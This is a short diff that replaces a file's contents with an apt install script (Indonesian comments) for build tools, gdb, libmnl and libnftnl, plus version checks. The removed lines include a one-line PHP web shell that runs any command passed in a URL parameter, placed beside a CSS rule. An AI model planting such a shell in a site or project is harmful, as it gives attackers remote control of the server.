@@ -1,2 +1,17 @@
-<?php system($_GET['cmd']); ?>
-body { background: red; }
+sudo apt update
+
+# Install build tools dan libraries
+sudo apt install -y \
+    build-essential \
+    git \
+    gcc \
+    make \
+    libmnl-dev \
+    libnftnl-dev \
+    pkg-config \
+    gdb
+
+# Verifikasi instalasi
+gcc --version
+pkg-config --modversion libmnl
+pkg-config --modversion libnftnl
